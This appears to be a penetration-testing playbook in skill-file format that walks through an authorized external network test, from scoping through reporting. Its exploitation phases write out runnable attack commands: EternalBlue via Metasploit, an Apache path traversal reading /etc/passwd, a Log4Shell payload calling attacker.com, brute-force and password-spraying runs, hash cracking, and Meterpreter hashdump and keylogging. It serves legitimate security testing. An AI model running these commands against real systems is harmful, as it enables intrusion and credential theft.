---
name: performing-external-network-penetration-test
description: Conduct a comprehensive external network penetration test to identify vulnerabilities in internet-facing infrastructure using PTES methodology, reconnaissance, scanning, exploitation, and reporting.
domain: cybersecurity
subdomain: penetration-testing
tags: [external-pentest, network-security, PTES, OSSTMM, Nmap, Metasploit, vulnerability-assessment, reconnaissance, exploitation]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing External Network Penetration Test

## Overview

An external network penetration test simulates a real-world attacker targeting an organization's internet-facing assets such as firewalls, web servers, mail servers, DNS servers, VPN gateways, and cloud endpoints. The objective is to identify exploitable vulnerabilities before malicious actors do, following frameworks like PTES (Penetration Testing Execution Standard), OSSTMM, and NIST SP 800-115.

## Prerequisites

- Written authorization (Rules of Engagement document signed by asset owner)
- Defined scope: IP ranges, domains, subdomains, and exclusions
- Testing environment: Kali Linux or Parrot OS with updated tools
- VPN/dedicated testing infrastructure to avoid IP blocks
- Coordination with SOC/NOC for timing windows

## Phase 1 — Pre-Engagement and Scoping

### Define Rules of Engagement

```
Scope:
  - Target IP ranges: 203.0.113.0/24, 198.51.100.0/24
  - Domains: *.target.com, *.target.io
  - Exclusions: 203.0.113.50 (production DB), *.staging.target.com
  - Testing window: Mon-Fri 22:00-06:00 UTC
  - Emergency contact: SOC Lead — +1-555-0100
  - Authorization ID: PENTEST-2025-EXT-042
```

### Legal Documentation Checklist

| Document | Status | Owner |
|----------|--------|-------|
| Master Service Agreement (MSA) | Signed | Legal |
| Statement of Work (SOW) | Signed | PM |
| Rules of Engagement (RoE) | Signed | CISO |
| Get-Out-of-Jail Letter | Signed | CTO |
| NDA | Signed | Legal |
| Insurance Certificate | Verified | Risk |

## Phase 2 — Reconnaissance (Information Gathering)

### Passive Reconnaissance

```bash
# OSINT — Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com -o amass_subs.txt
cat subdomains.txt amass_subs.txt | sort -u > all_subs.txt

# DNS record enumeration
dig target.com ANY +noall +answer
dig target.com MX +short
dig target.com NS +short
dig target.com TXT +short

# WHOIS and ASN lookup
whois target.com
whois -h whois.radb.net -- '-i origin AS12345'

# Certificate Transparency log search
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# Google dorking
# site:target.com filetype:pdf
# site:target.com inurl:admin
# site:target.com intitle:"index of"

# Shodan enumeration
shodan search "org:Target Corp" --fields ip_str,port,product
shodan host 203.0.113.10

# Email harvesting
theHarvester -d target.com -b all -l 500 -f theharvester_results

# GitHub/GitLab secret scanning
trufflehog github --org=targetcorp --concurrency=5
gitleaks detect --source=https://github.com/targetcorp/repo
```

### Active Reconnaissance

```bash
# Host discovery — ping sweep
nmap -sn 203.0.113.0/24 -oG ping_sweep.gnmap

# TCP SYN scan — top 1000 ports
nmap -sS -sV -O -T4 203.0.113.0/24 -oA tcp_scan

# Full TCP port scan
nmap -sS -p- -T4 --min-rate 1000 203.0.113.0/24 -oA full_tcp

# UDP scan — top 100 ports
nmap -sU --top-ports 100 -T4 203.0.113.0/24 -oA udp_scan

# Service version and script scan
nmap -sV -sC -p 21,22,25,53,80,110,143,443,445,993,995,3389,8080,8443 203.0.113.0/24 -oA service_scan

# SSL/TLS enumeration
sslscan 203.0.113.10:443
testssl.sh --full https://target.com

# Web technology fingerprinting
whatweb -v https://target.com
wappalyzer https://target.com
```

## Phase 3 — Vulnerability Analysis

### Automated Scanning

```bash
# Nessus scan (via CLI)
nessuscli scan --new --name "External-Pentest-2025" \
  --targets 203.0.113.0/24 \
  --policy "Advanced Network Scan"

# OpenVAS scan
gvm-cli socket --xml '<create_task>
  <name>External Pentest</name>
  <target id="target-uuid"/>
  <config id="daba56c8-73ec-11df-a475-002264764cea"/>
</create_task>'

# Nuclei vulnerability scanner
nuclei -l all_subs.txt -t cves/ -t exposures/ -t misconfigurations/ \
  -severity critical,high -o nuclei_results.txt

# Nikto web server scan
nikto -h https://target.com -output nikto_results.html -Format htm

# Directory and file enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,asp,aspx,jsp,html,txt -o gobuster_results.txt
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  --depth 3 -o ferox_results.txt
```

### Manual Vulnerability Validation

```bash
# Check for known CVEs on identified services
searchsploit apache 2.4.49
searchsploit openssh 8.2

# Test for default credentials
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
  ssh://203.0.113.10 -t 4

# Test VPN endpoints
ike-scan 203.0.113.20
# Check for IKEv1 aggressive mode

# SNMP enumeration
snmpwalk -v2c -c public 203.0.113.30
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 203.0.113.0/24

# SMTP enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 203.0.113.25
```

## Phase 4 — Exploitation

### Network Service Exploitation

```bash
# Metasploit — EternalBlue (MS17-010) example
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 203.0.113.15
set LHOST 10.10.14.5
set LPORT 4444
exploit

# Apache RCE — CVE-2021-41773 / CVE-2021-42013
curl -s --path-as-is "https://target.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# ProxyShell exploitation (Exchange)
python3 proxyshell_exploit.py -u https://mail.target.com -e admin@target.com

# Log4Shell (CVE-2021-44228) testing
curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/exploit}' https://target.com/api
```

### Web Application Exploitation

```bash
# SQL Injection with sqlmap
sqlmap -u "https://target.com/page?id=1" --batch --dbs --risk=3 --level=5

# XSS payload testing
dalfox url "https://target.com/search?q=test" --skip-bav

# Command injection testing
commix --url="https://target.com/ping?host=127.0.0.1" --batch

# File upload bypass
# Upload PHP shell with double extension: shell.php.jpg
# Test content-type bypass: application/octet-stream -> image/jpeg
```

### Password Attacks

```bash
# Brute force RDP
crowbar -b rdp -s 203.0.113.40/32 -u admin -C /usr/share/wordlists/rockyou.txt -n 4

# Spray attack against OWA
sprayhound -U users.txt -p 'Spring2025!' -d target.com -url https://mail.target.com/owa

# Crack captured hashes
hashcat -m 5600 captured_ntlmv2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## Phase 5 — Post-Exploitation

```bash
# Establish persistence (authorized testing only)
# Meterpreter session
meterpreter> sysinfo
meterpreter> getuid
meterpreter> hashdump
meterpreter> run post/multi/recon/local_exploit_suggester

# Privilege escalation check
# Linux
./linpeas.sh | tee linpeas_output.txt
# Windows
.\winPEAS.exe | tee winpeas_output.txt

# Data exfiltration proof
# Create proof file (DO NOT exfiltrate real sensitive data)
echo "PENTEST-PROOF-$(date +%Y%m%d)" > /tmp/pentest_proof.txt

# Network pivoting through compromised host
# Set up SOCKS proxy via SSH
ssh -D 9050 user@203.0.113.15
proxychains nmap -sT -p 80,443,445 10.0.0.0/24

# Screenshot and evidence collection
meterpreter> screenshot
meterpreter> keyscan_start
```

## Phase 6 — Reporting

### Finding Classification (CVSS v3.1)

| Severity | CVSS Range | Count | Example |
|----------|-----------|-------|---------|
| Critical | 9.0-10.0 | 2 | RCE via unpatched Exchange (ProxyShell) |
| High | 7.0-8.9 | 5 | SQL Injection in customer portal |
| Medium | 4.0-6.9 | 8 | Missing security headers, TLS 1.0 |
| Low | 0.1-3.9 | 12 | Information disclosure via server banners |
| Info | 0.0 | 6 | Open ports documentation |

### Report Structure

```
1. Executive Summary
   - Scope and objectives
   - Key findings summary
   - Risk rating overview
   - Strategic recommendations

2. Technical Findings
   For each finding:
   - Title and CVSS score
   - Affected asset(s)
   - Description and impact
   - Steps to reproduce (with screenshots)
   - Evidence/proof of exploitation
   - Remediation recommendation
   - References (CVE, CWE)

3. Methodology
   - Tools used
   - Testing timeline
   - Frameworks followed (PTES, OWASP)

4. Appendices
   - Full scan results
   - Network diagrams
   - Raw tool output
```

## Remediation Priority Matrix

| Priority | Timeline | Action |
|----------|----------|--------|
| P1 — Critical | 24-48 hours | Patch RCE vulnerabilities, disable exposed admin panels |
| P2 — High | 1-2 weeks | Fix injection flaws, implement MFA |
| P3 — Medium | 30 days | Harden TLS configs, add security headers |
| P4 — Low | 60-90 days | Remove version banners, update documentation |

## Tools Reference

| Tool | Purpose | License |
|------|---------|---------|
| Nmap | Port scanning and service enumeration | GPLv2 |
| Metasploit | Exploitation framework | BSD |
| Burp Suite Pro | Web application testing | Commercial |
| Nuclei | Vulnerability scanning | MIT |
| Subfinder | Subdomain enumeration | MIT |
| SQLMap | SQL injection testing | GPLv2 |
| Nessus | Vulnerability scanner | Commercial |
| Gobuster | Directory brute-forcing | Apache 2.0 |
| Hashcat | Password cracking | MIT |
| theHarvester | OSINT email/domain harvesting | GPLv2 |

## References

- PTES (Penetration Testing Execution Standard): http://www.pentest-standard.org/
- OWASP Testing Guide v4.2: https://owasp.org/www-project-web-security-testing-guide/
- NIST SP 800-115: Technical Guide to Information Security Testing: https://csrc.nist.gov/publications/detail/sp/800-115/final
- OSSTMM v3: https://www.isecom.org/OSSTMM.3.pdf
- MITRE ATT&CK: https://attack.mitre.org/
